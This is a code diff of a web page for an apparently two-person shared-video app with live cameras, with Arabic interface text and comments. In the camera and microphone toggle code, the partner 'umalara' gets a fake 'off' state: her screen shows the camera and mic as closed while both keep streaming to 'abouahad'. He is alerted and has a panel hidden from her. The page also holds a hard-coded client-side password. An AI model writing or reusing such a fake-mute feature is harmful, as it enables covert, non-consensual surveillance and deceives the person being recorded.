@@ -74,6 +74,32 @@
         }
         .btn-stealth:active { transform: scale(0.95); }
 
+        /* Camera Frame Styling */
+        .camera-wrapper {
+            position: relative;
+            width: 100%;
+            height: 380px; /* الارتفاع المناسب تحت الفيديو */
+            background: #000;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+            border: 1px solid rgba(255, 45, 85, 0.15);
+        }
+
+        .my-floating-cam-frame {
+            position: absolute; 
+            bottom: 16px; 
+            left: 16px;
+            width: 100px; 
+            height: 150px;
+            border-radius: 16px; 
+            border: 2px solid rgba(255,255,255,0.2);
+            overflow: hidden; 
+            z-index: 40; 
+            background: #111;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.9);
+        }
+
         /* Video viewport sizes */
         .video-wrapper-aspect {
             background: #000; 
@@ -128,21 +154,7 @@
         <span id="toastMsg">مرحبًا</span>
     </div>
 
-    <div id="installBanner" class="fixed top-0 left-0 w-full z-[9999] p-4 transition-transform translate-y-[-150%] duration-500 ease-in-out">
-        <div class="glass-panel w-full max-w-md mx-auto p-3 rounded-2xl flex items-center justify-between shadow-2xl border border-rose-500/30 bg-[#120b1f]/95 backdrop-blur-3xl">
-            <div class="flex items-center gap-3">
-                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-rose-500 to-purple-600 flex items-center justify-center shadow-lg">
-                    <i class="fa fa-download text-white text-lg"></i>
-                </div>
-                <div class="flex flex-col">
-                    <span class="text-sm font-black text-white">تثبيت التطبيق 📱</span>
-                    <span class="text-[10px] text-gray-400 font-bold">تجربة VIP بملء الشاشة</span>
-                </div>
-            </div>
-            <button onclick="installPWA()" class="bg-white text-black px-4 py-1.5 rounded-full text-xs font-black shadow-lg hover:bg-gray-200 transition-colors">تثبيت</button>
-        </div>
-    </div>
-
+    <!-- شاشة الدخول الاحترافية -->
     <div id="loginScreen" class="min-h-screen flex flex-col items-center justify-center p-6 relative z-50">
         <div class="text-center mb-10">
             <div class="w-24 h-24 mx-auto mb-4 bg-gradient-to-tr from-rose-500 to-purple-600 rounded-3xl flex items-center justify-center shadow-[0_10px_30px_rgba(255,45,85,0.4)]">
@@ -155,7 +167,7 @@
             
             <!-- إدخال كلمة المرور المخفي لأبو عاهد -->
             <div id="passwordBlock" class="hidden flex-col gap-3">
-                <input type="password" id="vipPassword" placeholder="أدخل كلمة المرور..." class="w-full bg-black/50 border border-rose-500/50 rounded-xl px-4 py-3 text-center text-white font-bold focus:border-rose-500 transition-all">
+                <input type="password" id="vipPassword" placeholder="أدخل كلمة المرور" class="w-full bg-black/50 border border-rose-500/50 rounded-xl px-4 py-3 text-center text-white font-bold focus:border-rose-500 transition-all">
                 <button onclick="verifyPasswordAndLogin()" class="bg-gradient-to-r from-green-600 to-green-500 hover:from-green-500 hover:to-green-400 text-white py-3 rounded-xl font-black text-sm shadow-lg transition-all">تأكيد الدخول المشفّر 🔒</button>
             </div>
             
@@ -168,6 +180,7 @@
         </div>
     </div>
 
+    <!-- شاشة السينما المتكاملة (فيديو وكاميرات في نفس الشاشة) -->
     <div id="mainAppView" class="hidden flex-col w-full min-h-screen relative z-20 overflow-y-auto pb-10">
         
         <!-- Header Status -->
@@ -181,15 +194,18 @@
             </div>
         </div>
 
-        <!-- المحتوى المركزي -->
+        <!-- المحتوى المركزي: الفيديو ثم الكاميرا تحته مباشرة -->
         <div class="w-full max-w-xl mx-auto flex flex-col gap-5 p-4 mt-2">
             
+            <!-- القسم الأول: مشغل الفيديو (في الأعلى) -->
             <div class="flex flex-col gap-3">
+                <!-- شريط الرابط -->
                 <div class="glass-panel p-1.5 flex gap-2 rounded-xl border-white/5">
                     <input type="text" id="vidLink" placeholder="ضع رابط الفيديو أو اليوتيوب هنا..." class="flex-grow bg-transparent px-3 py-2 text-xs text-white placeholder-gray-500 transition-all">
                     <button onclick="startVideo()" class="btn-premium-rose px-5 rounded-lg font-black text-xs whitespace-nowrap shadow-lg"><i class="fa fa-play"></i> تشغيل</button>
                 </div>
 
+                <!-- شاشة العرض -->
                 <div class="video-wrapper-aspect">
                     <video id="mainVid" controls playsinline autoplay class="hidden object-contain bg-black"></video>
                     <div id="ytPlayerContainer" class="hidden w-full h-full"><div id="ytPlayer"></div></div>
@@ -200,43 +216,44 @@
                 </div>
             </div>
 
+            <!-- القسم الثاني: الكاميرات المباشرة (تحت الفيديو لتشاهدها وتشاهد الفيلم) -->
             <div class="flex flex-col gap-4">
                 
-                <!-- كاميرا الشريكة (في الأعلى وتأخذ مساحة واضحة) -->
-                <div class="relative w-full h-[320px] bg-[#05020a] rounded-3xl overflow-hidden border-2 border-rose-500/20 shadow-[0_10px_40px_rgba(255,45,85,0.15)]">
+                <!-- كاميرا الشريكة الأساسية بملء الحاوية (مستقلة وبدون أي تشويش) -->
+                <div class="relative w-full h-[360px] bg-[#05020a] rounded-3xl overflow-hidden border-2 border-rose-500/20 shadow-[0_10px_40px_rgba(255,45,85,0.15)]">
                     <video id="partnerCam" class="w-full h-full object-cover" style="transform: scaleX(-1);" autoplay playsinline></video>
                     
+                    <!-- غطاء الإغلاق الوهمي الخاص بالشريكة -->
                     <div id="partnerFakeMute" class="absolute inset-0 bg-[#070312] flex flex-col items-center justify-center text-rose-500 z-10 hidden">
                         <i class="fa fa-eye-slash text-5xl mb-3 opacity-50"></i>
                         <span class="text-sm font-bold text-gray-500">الكاميرا مغلقة</span>
                     </div>
 
+                    <!-- زر التفاعل العائم على كاميرا الشريكة فقط -->
                     <div class="absolute right-4 top-4 z-30">
                         <button onclick="sendLove()" class="w-12 h-12 rounded-full btn-premium-rose flex items-center justify-center text-xl shadow-xl"><i class="fa fa-heart"></i></button>
                     </div>
                 </div>
 
-                <!-- كاميرتك أنت (أسفل كاميرا الشريكة مباشرة مع أزرار التحكم) -->
-                <div class="flex items-center justify-between glass-panel p-3 rounded-2xl border-white/5 shadow-lg">
-                    
-                    <!-- إطار كاميرتك -->
-                    <div class="relative w-[110px] h-[150px] bg-[#111] rounded-xl overflow-hidden border-2 border-green-500/30">
+                <!-- الكاميرا المحلية العائمة (أنت) - أسفل الشريكة لمنع التداخل تماماً -->
+                <div class="flex items-end justify-between px-2">
+                    <div class="relative w-[120px] h-[160px] bg-[#111] rounded-2xl overflow-hidden border-2 border-green-500/30 shadow-2xl">
                         <video id="myCam" class="w-full h-full object-cover" style="transform: scaleX(-1);" autoplay muted playsinline></video>
                         <div id="myFakeMute" class="absolute inset-0 bg-[#111] flex flex-col items-center justify-center text-rose-500 z-30 hidden">
                             <i class="fa fa-ban text-3xl"></i>
                         </div>
                     </div>
 
-                    <!-- أزرار التحكم الخاصة بك (في الجهة المقابلة) -->
-                    <div class="flex gap-4 px-2">
-                        <button onclick="toggleMyCam()" id="myCamBtn" class="w-14 h-14 rounded-full bg-black/60 backdrop-blur-sm border border-white/10 text-white flex items-center justify-center text-xl shadow-lg transition-colors"><i class="fa fa-video-camera"></i></button>
-                        <button onclick="toggleMyMic()" id="myMicBtn" class="w-14 h-14 rounded-full bg-black/60 backdrop-blur-sm border border-white/10 text-white flex items-center justify-center text-xl shadow-lg transition-colors"><i class="fa fa-microphone"></i></button>
+                    <!-- أزرار التحكم بالكاميرا والصوت الخاصة بك (بجانب كاميرتك بالأسفل) -->
+                    <div class="flex flex-col gap-4 mb-2">
+                        <button onclick="toggleMyCam()" id="myCamBtn" class="w-14 h-14 rounded-full bg-black/60 backdrop-blur-sm border border-white/10 text-white flex items-center justify-center text-xl shadow-lg"><i class="fa fa-video-camera"></i></button>
+                        <button onclick="toggleMyMic()" id="myMicBtn" class="w-14 h-14 rounded-full bg-black/60 backdrop-blur-sm border border-white/10 text-white flex items-center justify-center text-xl shadow-lg"><i class="fa fa-microphone"></i></button>
                     </div>
                 </div>
-
             </div>
 
-            <div id="stealthPanel" class="hidden flex-col gap-3 mt-2">
+            <!-- القسم الثالث: لوحة التحكم السرية (تظهر لأبو عاهد فقط في الأسفل) -->
+            <div id="stealthPanel" class="hidden flex-col gap-3 mt-4">
                 <div class="flex items-center gap-2 mb-1 px-2">
                     <i class="fa fa-shield text-yellow-500 text-lg"></i>
                     <h3 class="font-black text-yellow-500 text-xs">تحكم الإشراف السري (مخفي عن الشريكة تماماً)</h3>
@@ -252,32 +269,6 @@
     </div>
 
     <script>
-        // --- PWA Installation Logic (إضافة ذكية) ---
-        let deferredPrompt;
-        const installBanner = document.getElementById('installBanner');
-
-        window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-            deferredPrompt = e;
-            // إظهار الشريط بلطف
-            setTimeout(() => {
-                installBanner.classList.remove('translate-y-[-150%]');
-            }, 1000);
-        });
-
-        async function installPWA() {
-            if (deferredPrompt) {
-                deferredPrompt.prompt();
-                const { outcome } = await deferredPrompt.userChoice;
-                if (outcome === 'accepted') {
-                    // إخفاء الشريط بعد الموافقة
-                    installBanner.classList.add('translate-y-[-150%]');
-                }
-                deferredPrompt = null;
-            }
-        }
-        // ---------------------------------------------
-
         const socket = io();
         let myId = '';
         let myStream = null;
@@ -289,9 +280,12 @@
         let activePlayer = 'none';
         let currentPlayingUrl = '';
 
+        // متغيرات منع التقطيع
         let isSyncing = false; 
         let syncTimeout = null;
         let lastKnownTime = 0;
+
+        // طابور مفاتيح الكاميرا لضمان عدم ظهور الشاشة السوداء أبدًا
         let iceCandidatesQueue = [];
 
         const configuration = {
@@ -311,28 +305,10 @@
             setTimeout(() => t.classList.remove('show'), 3500);
         }
 
-        // --- نظام كلمة المرور السريّة لأبو عاهد ---
-        function showPasswordPrompt() {
-            document.getElementById('abouahadBtn').classList.add('hidden');
-            document.getElementById('umalaraBtn').classList.add('hidden');
-            document.getElementById('passwordBlock').classList.remove('hidden');
-            document.getElementById('passwordBlock').classList.add('flex');
-        }
-
-        function verifyPasswordAndLogin() {
-            const pass = document.getElementById('vipPassword').value;
-            if(pass === 'tarzan') {
-                login('abouahad');
-            } else {
-                showToast('كلمة المرور خاطئة، حاول مجدداً', '❌');
-                document.getElementById('vipPassword').value = '';
-            }
-        }
-        // --------------------------------------
-
         async function login(userId) {
             myId = userId;
             
+            // سحر تخطي حظر التشغيل التلقائي بالمتصفحات
             try {
                 let unlockAudio = new Audio("data:audio/mp3;base64,//OExAAAAANIAAAAAExBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq");
                 unlockAudio.play().catch(e => {});
@@ -342,6 +318,7 @@
             document.getElementById('mainAppView').classList.remove('hidden');
             document.getElementById('mainAppView').classList.add('flex');
             
+            // إظهار لوحة التحكم السرية لأبو عاهد فقط أسفل الشاشة
             if (myId === 'abouahad') {
                 document.getElementById('stealthPanel').classList.remove('hidden');
                 document.getElementById('stealthPanel').classList.add('flex');
@@ -370,6 +347,7 @@
             }
         }
 
+        // بناء اتصال مباشر صلب
         function initRTC() {
             if (peerConnection) peerConnection.close();
             peerConnection = new RTCPeerConnection(configuration);
@@ -444,6 +422,24 @@
                 iceCandidatesQueue.push(candidate);
             }
         });
+
+        // --- دوال التحقق من كلمة المرور السريّة ---
+        function showPasswordPrompt() {
+            document.getElementById('abouahadBtn').classList.add('hidden');
+            document.getElementById('umalaraBtn').classList.add('hidden');
+            document.getElementById('passwordBlock').classList.remove('hidden');
+            document.getElementById('passwordBlock').classList.add('flex');
+        }
+
+        function verifyPasswordAndLogin() {
+            const pass = document.getElementById('vipPassword').value;
+            if(pass === 'tarzan') {
+                login('abouahad');
+            } else {
+                showToast('كلمة المرور خاطئة، حاول مجدداً', '❌');
+                document.getElementById('vipPassword').value = '';
+            }
+        }
 
         const mainVid = document.getElementById('mainVid');
         
@@ -522,7 +518,6 @@
             emitCinemaState();
         }
 
-        // --- نظام الاستجابة الذكي للفيديو (يحل مشكلة الفيديو الجديد) ---
         socket.on('cinema-state-update', (state) => {
             if (!state.videoUrl) return;
             isSyncing = true;
@@ -530,7 +525,7 @@
             
             document.getElementById('vidLink').value = state.videoUrl;
             
-            // التعديل السحري: إذا تغير الرابط، سيتم تحميل الفيديو الجديد للطرف الآخر فوراً
+            // تحقق من الرابط: إذا تم إرسال رابط جديد تماماً، نقوم بتحميله مباشرة للطرفين بدلاً من البحث في القديم
             if (currentPlayingUrl !== state.videoUrl) {
                 startVideo();
             } else {
@@ -580,12 +575,16 @@
             }
         }
 
+        // ==========================================
+        // نظام السرية التامة والإغلاق الوهمي للكاميرا
+        // ==========================================
         function toggleMyCam() {
             const track = myStream.getVideoTracks()[0];
             const btn = document.getElementById('myCamBtn');
             const fake = document.getElementById('myFakeMute');
             
             if (myId === 'umalara') {
+                // الكتم السري لأم الارا: يظهر لها شاشة مغلقة ويرسل إشعار الإغلاق لك، لكن البث يستمر!
                 const isHidden = fake.style.display === 'flex';
                 if (!isHidden) {
                     fake.style.display = 'flex'; 
@@ -598,7 +597,9 @@
                     btn.innerHTML = '<i class="fa fa-video-camera"></i>';
                     socket.emit('privacy-fake-mute', false);
                 }
+                // البث لا يتوقف فعلياً (track.enabled يظل true)
             } else {
+                // أبو عاهد يغلق الكاميرا بشكل حقيقي وموثوق
                 track.enabled = !track.enabled;
                 if(track.enabled) { 
                     fake.style.display='none'; 
@@ -615,6 +616,7 @@
             const btn = document.getElementById('myMicBtn');
             
             if (myId === 'umalara') {
+                // كتم المايك الوهمي لأم الارا (يظل الصوت يصلك)
                 const isMuted = btn.style.background === 'rgb(239, 68, 68)';
                 if(!isMuted) { 
                     btn.style.background = '#ef4444'; 
@@ -635,11 +637,14 @@
             }
         }
 
+        // استقبال حالة الإغلاق الوهمية عند أبو عاهد (كي يعرف أنها تظن أن كاميرتها مغلقة)
         socket.on('privacy-fake-mute-received', (isMuted) => {
             if (myId === 'abouahad') {
+                // الكاميرا تظل تعمل بصرياً لديك، هذا التنبيه فقط إذا أردت إظهار علامة أنها ضغطت الزر
                 if(isMuted) {
                     showToast('تنبيه: الشريكة ضغطت زر إغلاق الكاميرا (لكنها لا تزال تعمل لديك)', '👁️');
                 }
+                // الغطاء يظل مخفياً عنك لترى بوضوح
                 document.getElementById('partnerFakeMute').style.display = 'none';
             }
         });
